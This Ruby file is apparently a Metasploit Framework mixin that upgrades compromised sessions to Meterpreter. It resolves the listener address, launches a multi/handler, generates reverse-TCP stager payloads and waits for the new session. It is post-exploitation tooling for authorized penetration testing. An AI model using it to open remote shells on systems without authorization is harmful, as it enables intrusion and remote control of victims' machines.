# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#
# Shared orchestration logic for session upgrade modules. Provides LHOST
# resolution, handler lifecycle, payload generation, and wait-for-session
# polling. Consuming modules implement `execute_upgrade` for delivery.
#
module Msf::Post::SessionUpgrade
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Retry

  def initialize(info = {})
    super

    register_options(
      [
        Msf::OptAddressLocal.new('LHOST', [false, 'IP of host that will receive the connection from the payload.']),
        Msf::OptInt.new('LPORT', [true, 'Port for payload to connect to.', 4444]),
        Msf::OptBool.new('HANDLER', [true, 'Start an exploit/multi/handler to receive the connection.', true])
      ]
    )

    register_advanced_options(
      [
        Msf::OptInt.new('HANDLE_TIMEOUT', [true, 'How long to wait (in seconds) for the session to come back.', 30])
      ]
    )
  end

  # Orchestration entry point. Consuming modules call this from `run`.
  def run_upgrade
    lhost = resolve_lhost
    if lhost.nil?
      fail_with(Msf::Exploit::Failure::BadConfig, 'Unable to determine LHOST. Please set LHOST manually.')
    end

    existing_session_ids = framework.sessions.keys.map(&:to_i).to_set

    start_upgrade_handler(lhost) if datastore['HANDLER']

    execute_upgrade(lhost)

    if datastore['HANDLER']
      wait_for_upgrade_session(existing_session_ids)
    end
  ensure
    cleanup_upgrade_handler
  end

  # Contract method — consuming modules must override this to deliver the
  # payload to the target. Raises NotImplementedError if not implemented.
  def execute_upgrade(lhost)
    raise NotImplementedError, 'Consuming modules must implement execute_upgrade(lhost)'
  end

  # Generates raw stager bytes via the framework payload API.
  #
  # @param lhost [String] the listen host for the payload
  # @param lport [Integer, String] the listen port for the payload
  # @param payload_name [String] framework payload name (e.g. 'windows/meterpreter/reverse_tcp')
  # @return [String, nil] raw payload bytes on success, nil on failure
  def generate_upgrade_payload(lhost, lport, payload_name)
    payload_obj = framework.payloads.create(payload_name)
    unless payload_obj
      print_error("Invalid payload: #{payload_name}")
      return nil
    end

    unless payload_obj.respond_to?(:generate_simple)
      print_error("Payload #{payload_name} does not support generate_simple")
      return nil
    end

    payload_obj.generate_simple('OptionStr' => "LHOST=#{lhost} LPORT=#{lport}")
  end

  private

  # Resolves the listener address using a three-source fallback:
  # module datastore > framework datastore > session tunnel_local.
  def resolve_lhost
    if datastore['LHOST'].present?
      return datastore['LHOST']
    end

    if framework.datastore['LHOST'].present?
      return framework.datastore['LHOST']
    end

    tunnel = session.tunnel_local
    if tunnel.present?
      if tunnel.include?('Local Pipe')
        print_error('Cannot determine LHOST from session. Please set LHOST manually.')
        return nil
      end

      host = tunnel.split(':').first
      if host.blank?
        print_error('Cannot determine LHOST from session. Please set LHOST manually.')
        return nil
      end

      return host
    end

    print_error('Unable to determine LHOST. Please set LHOST manually.')
    nil
  end

  # Checks whether a multi/handler is already listening on the given address and port.
  def check_for_listener(lhost, lport)
    framework.jobs.each_value do |j|
      next unless j.name =~ %r{multi/handler}

      job_lhost = j.ctx[0].datastore['LHOST']
      job_lport = j.ctx[0].datastore['LPORT']
      if lhost == job_lhost && lport == job_lport.to_i
        return true
      end
    end
    false
  end

  # Starts an exploit/multi/handler as a background job to receive the upgraded session.
  def start_upgrade_handler(lhost)
    payload_name = datastore['PAYLOAD']
    lport = datastore['LPORT']

    if check_for_listener(lhost, lport)
      fail_with(Msf::Exploit::Failure::BadConfig, "Port #{lport} is already in use by another handler.")
    end

    print_status("Starting exploit/multi/handler on #{lhost}:#{lport}")

    handler_mod = framework.exploits.create('multi/handler')
    handler_mod.datastore['PAYLOAD'] = payload_name
    handler_mod.datastore['LHOST'] = lhost
    handler_mod.datastore['LPORT'] = lport
    handler_mod.datastore['ExitOnSession'] = true

    handler_mod.exploit_simple({
      'Payload' => payload_name,
      'LocalInput' => user_input,
      'LocalOutput' => user_output,
      'RunAsJob' => true
    })

    # Allow handler time to bind; if it fails, the job disappears
    Rex::ThreadSafe.sleep(2)
    if framework.jobs[handler_mod.job_id.to_s].nil?
      fail_with(Msf::Exploit::Failure::Unknown, "Handler failed to start on port #{lport}. Port may be in use.")
    end

    @upgrade_handler_job_id = handler_mod.job_id.to_s
  end

  # Polls framework.sessions for a new session ID not in the existing set.
  def wait_for_upgrade_session(existing_session_ids)
    timeout = datastore['HANDLE_TIMEOUT']
    print_status("Waiting up to #{timeout} seconds for Meterpreter session...")

    new_session = poll_until_truthy(timeout: timeout) do
      new_ids = framework.sessions.keys.map(&:to_i).to_set - existing_session_ids
      new_ids.first unless new_ids.empty?
    end

    if new_session
      print_good('Meterpreter session opened successfully!')
      true
    else
      print_error("No session received within #{timeout} seconds. Increase HANDLE_TIMEOUT to wait longer")
      false
    end
  end

  # Stops the background handler job and clears the tracking state.
  def cleanup_upgrade_handler
    return unless @upgrade_handler_job_id

    if framework.jobs[@upgrade_handler_job_id]
      framework.jobs.stop_job(@upgrade_handler_job_id)
    end
    @upgrade_handler_job_id = nil
  end
end
